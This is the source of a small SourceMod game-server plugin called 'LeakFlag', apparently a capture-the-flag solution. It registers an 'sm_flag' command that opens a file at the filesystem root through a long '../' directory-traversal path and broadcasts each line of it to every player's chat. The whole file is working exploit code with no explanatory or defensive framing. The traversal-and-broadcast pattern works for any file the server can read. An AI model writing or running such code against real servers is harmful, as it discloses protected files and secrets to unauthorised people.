#include <sourcemod>

#define PLUGIN_VERSION "0.0.1"
#define PLUGIN_NAME "LeakFlag"

public Plugin:myinfo =
{
	name = PLUGIN_NAME,
	author = "Cypis",
	description = "",
	version = PLUGIN_VERSION,
	url = "http://steamcommunity.com/id/cypiss/"
}

public OnPluginStart()
{
	RegConsoleCmd("sm_flag", CmdFlag);
}

public Action:CmdFlag(client, args)
{
	if(!IsClientInGame(client))
		return Plugin_Continue;

	new Handle:open = OpenFile("../../../../../../../../../../../../../../../../../../flag.txt", "rt");
	decl String:szText[128];

	while(!IsEndOfFile(open))
	{
		ReadFileLine(open, szText, sizeof(szText));
		PrintToChatAll("ReadFile: %s", szText);
	}
	CloseHandle(open);
	return Plugin_Continue;
}


